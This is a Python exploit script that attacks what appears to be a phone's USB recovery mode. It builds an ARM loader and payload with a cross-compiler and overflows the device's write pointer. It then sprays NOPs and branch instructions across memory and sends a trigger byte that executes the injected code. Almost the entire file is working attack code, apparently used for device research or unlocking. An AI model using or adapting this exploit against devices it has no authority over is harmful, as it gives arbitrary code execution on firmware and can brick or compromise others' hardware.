import usb.core
import usb.util
import struct
import random
import sys
import time
import argparse
import os
import tempfile
import subprocess


PAYLOAD_PATH = os.path.dirname(os.path.realpath(__file__))
LINKER = """
ENTRY(start)

SECTIONS
{
  . = BASE;

  .text     : { *(.text.start) *(.text   .text.*   .gnu.linkonce.t.*) }
  .rodata   : { *(.rodata .rodata.* .gnu.linkonce.r.*) }
  .bss      : { *(.bss    .bss.*    .gnu.linkonce.b.*) *(COMMON) }
  .data     : { *(.data   .data.*   .gnu.linkonce.d.*) }
  /DISCARD/ : { *(.interp) *(.dynsym) *(.dynstr) *(.hash) *(.dynamic) *(.comment) }
}
"""

CC = ["arm-none-eabi-gcc", "-c", "-Os", "-march=armv4", "-fno-builtin-printf", "-fno-strict-aliasing", "-fno-builtin-memcpy", "-fno-builtin-memset", "-fno-builtin", "-I", PAYLOAD_PATH]
AS = ["arm-none-eabi-as", "-c"]
LD = ["arm-none-eabi-gcc", "-nodefaultlibs", "-nostdlib"]
OBJCOPY = ["arm-none-eabi-objcopy", "-O", "binary"]


class PayloadBuilder:

    def __init__(self, srcfile):
        self.ext = "c"
        if srcfile.endswith(".S"):
            self.ext = "S"
        with open(os.path.join(PAYLOAD_PATH, srcfile)) as inf:
            self.src = inf.read()

    def build(self, **kwargs):
        base = kwargs["base"]
        src = self.src
        for arg, replacement in kwargs.items():
            src = src.replace("%{}%".format(arg), str(replacement))

        with tempfile.TemporaryDirectory() as tmp:
            p_linker_x = os.path.join(tmp, "linker.x")
            p_payload_src = os.path.join(tmp, "payload.{}".format(self.ext))
            p_payload_o = os.path.join(tmp, "payload.o")
            p_payload = os.path.join(tmp, "payload")
            p_payload_bin = os.path.join(tmp, "payload.bin")

            with open(p_linker_x, "w") as outf:
                outf.write(LINKER.replace("BASE", hex(base)))
            with open(p_payload_src, "w") as outf:
                outf.write(src)
            if self.ext == "c":
                subprocess.check_output(CC + ["-o", p_payload_o, p_payload_src])
            elif self.ext == "S":
                subprocess.check_output(AS + ["-o", p_payload_o, p_payload_src])
            subprocess.check_output(LD + ["-T", p_linker_x, "-o", p_payload, p_payload_o, "-lgcc"])
            subprocess.check_output(OBJCOPY + [p_payload, p_payload_bin])
            with open(p_payload_bin, "rb") as inf:
                payload = inf.read()
        return payload


def mask_payload(buf):
    output = []
    for ch in buf:
        if ch in [0xF0, 0xFF, 0xFE]:
            output.append(0xF0)
            output.append(ch ^ 0x10)
        else:
            output.append(ch)
    output += [0xF0, 0xF0]
    return bytes(output)


class Exploit:

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--vid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--pid', type=lambda x: int(x, 16), required=True)

        self.args = parser.parse_args()
        self.build_payload()

    def build_payload(self):
        loader = PayloadBuilder("loader.S").build(base=0xDEAD0000)
        assert loader[-4:] == b"\xEF\xBE\xAD\xDE"
        loader = loader[:-4]
        payload = PayloadBuilder("payload.c").build(base=0x80000000)
        self.payload = loader + mask_payload(payload)

    def write_fully(self, buffer):
        assert b"\xFE" not in buffer and b"\xFF" not in buffer
        for x in range(0, len(buffer), 64):
            chunk = buffer[x:x+64]
            assert self.dev.write(8, chunk) == len(chunk)

    def run(self):
        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)
        if self.dev is None:
            raise RuntimeError("cannot find device with VID={:04X} PID={:04X}".format(self.args.vid, self.args.pid))

        # go into serial comms mode => turns green led on for some, display on
        print("Enter recovery mode")
        self.dev.ctrl_transfer(0x41, 0x60, 0x60, 2)
        self.dev.read(0x86, 64)

        # some devices e.g. n-02c need delay/reinit before it can be used
        print("Wait 3s...")
        time.sleep(3)
        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)

        print("1) move writeptr behind code")
        overflow_payload = b"\x00" * 0x273a4 + b"\xa4\x73\x02\xFD"
        # overflow_payload = b""
        # for x in range(0x10000):
        #     bdata = struct.pack("<I", len(overflow_payload) | 0xFD000000)
        #     if b"\xFF" in bdata or b"\xFE" in bdata:
        #         bdata = b"\x42\x42\x42\x42"
        #     overflow_payload += bdata

        self.write_fully(overflow_payload)

        current = (0x80bf5934 + (0xFD0273a4)) & 0xFFFFFFFF

        # now pointer is around ~0x7dc1ccd8

        total = 0

        megs = 40
        print("2) {} mb of nops, current=0x{:X}".format(megs, current))
        for x in range(0, megs * 1024 * 1024, 64):
            chunk = b"\x00" * 64
            assert self.dev.write(0x8, chunk) == len(chunk)
            current += len(chunk)
            total += len(chunk)

            if total % (2 * 1024 * 1024) == 0:
                print("wrote {} MB, current=0x{:X}".format(total / 1024 / 1024, current))

        print("3) write payload at=0x{:X}".format(current))
        self.write_fully(self.payload)
        current += len(self.payload)

        print("4) spam shellcode jump starting at=0x{:X}".format(current))
        if current % 0x100 != 0:
            chunk = b"\x00" * (0x100 - (current % 0x100))
            self.write_fully(chunk)
            current += len(chunk)
        assert current % 0x100 == 0

        total = 0
        try:
            while True:
                # chunk = b"\xBB" * 64
                chunk = b"\x02\xf1\xa0\xe3" * 16
                assert len(chunk) == 64
                assert self.dev.write(0x8, chunk) == len(chunk)
                total += len(chunk)
                current += len(chunk)

                if current == 0x80b80000:
                    break

                if total % (1024 * 1024) == 0:
                    print("wrote {} MB, current=0x{:X}".format(total / 1024 / 1024, current))
        except (Exception, KeyboardInterrupt):
            print("wrote before exception: 0x{:X}".format(total))
            print("exception at current=0x{:X}".format(current))
            raise

        print("finish! current = 0x{:X}".format(current))
        self.write_fully(b"\x00" * 0xF0)
        # write_fully(b"\x10\x40\x2d\xe9")
        # write_fully(b"\xFA\xFA\xFA\xFA" * 0x100)
        self.write_fully(b"\x02\xf1\xa0\xe3" * 0x100)

        # trigger code exec
        self.dev.write(8, b"\xFE")


def main():
    e = Exploit()
    e.run()


if __name__ == "__main__":
    main()
